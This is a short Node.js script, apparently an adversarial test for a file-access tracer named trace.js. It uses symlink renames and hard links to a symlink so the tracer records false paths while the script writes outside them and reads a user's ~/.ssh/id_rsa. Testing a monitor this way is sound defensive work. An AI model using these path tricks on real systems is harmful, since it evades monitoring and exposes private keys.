'use strict';
// trace.js forgets a symlink on rename (from and to) and never records a hard link to a
// symlink, so walk() treats the surviving symlink as a plain directory and pops ".." lexically.
const fs = require('node:fs');
const log = (m) => console.log('[adv7-renlink]', m);
const t = (n, f) => { try { const r = f(); log(`${n}: ${r === undefined ? 'done' : r}`); } catch (e) { log(`${n}: ${e.code}`); } };
const DEEP = '/usr/local/lib/node_modules/npm';
// 1. rename the symlink itself: kernel /usr/work/qpr, recorded /work/qpr
t('symlink /tmp/r1 -> DEEP', () => fs.symlinkSync(DEEP, '/tmp/r1'));
t('rename /tmp/r1 -> /tmp/r2', () => fs.renameSync('/tmp/r1', '/tmp/r2'));
t('mkdir /tmp/r2/../../../../work/qpr (a)', () => fs.mkdirSync('/tmp/r2/../../../../work/qpr'));
// 2. hard link to the symlink (link() does not follow): kernel /usr/work/qph
t('symlink /tmp/h1 -> DEEP', () => fs.symlinkSync(DEEP, '/tmp/h1'));
t('link /tmp/h1 -> /tmp/h2', () => fs.linkSync('/tmp/h1', '/tmp/h2'));
t('lstat /tmp/h2 is symlink', () => fs.lstatSync('/tmp/h2').isSymbolicLink());
t('mkdir /tmp/h2/../../../../work/qph (a)', () => fs.mkdirSync('/tmp/h2/../../../../work/qph'));
// 3. rename the parent directory of a symlink into HOME: kernel /home/qp/.ssh/id_rsa
t('mkdir /home/qp/ra/rb', () => fs.mkdirSync('/home/qp/ra/rb', { recursive: true }));
t('mkdir /tmp/d1', () => fs.mkdirSync('/tmp/d1'));
t('symlink /tmp/d1/l -> /home/qp/ra/rb', () => fs.symlinkSync('/home/qp/ra/rb', '/tmp/d1/l'));
t('rename /tmp/d1 -> /tmp/d2', () => fs.renameSync('/tmp/d1', '/tmp/d2'));
t('read /tmp/d2/l/../../.ssh/id_rsa (b)', () => fs.readFileSync('/tmp/d2/l/../../.ssh/id_rsa', 'utf8').length);
